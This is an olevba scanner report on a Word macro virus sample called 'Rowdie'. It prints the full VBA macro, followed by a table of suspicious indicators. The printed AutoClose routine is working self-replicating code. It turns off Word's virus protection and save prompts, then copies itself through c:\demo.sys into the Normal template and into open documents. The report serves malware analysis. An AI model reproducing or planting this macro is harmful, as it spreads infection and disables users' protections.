olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Rowdie
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Rowdie - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module11.bas 
in file: Virus.MSWord.Intended.Rowdie - OLE stream: 'Macros/VBA/Module11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
NormInstall = False
ActiveInstall = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).CodeModule.Lines(3, 1) = "Sub AutoClose()" Then
NormInstall = True
Exit For
End If
Next i
For ii = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ii).CodeModule.Lines(3, 1) = "Sub AutoClose()" Then
ActivInstall = True
Exit For
End If
Next ii
If NormInstall = True Then NormalTemplate.VBProject.VBComponents(i).Export "c:\demo.sys"
If ActivInstall = True Then ActiveDocument.VBProject.VBComponents(ii).Export "c:\demo.sys"
If NormInstall = False Then
Set Dobj = NormalTemplate.VBProject
Else
If ActivInstall = False And NormInstall = True Then Set Dobj = ActiveDocument.VBProject
act = 1
End If
If act = 1 Then
Dobj.VBComponents.Import ("c:\demo.sys")
ActiveDocument.Save
ActiveDocument.Saved = True
Exit Sub
End If
Dobj.VBComponents.Import ("c:\demo.sys")
End Sub
Sub ViewVBCode()
'This is Buggy by Roadkil[UC] 1999'
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

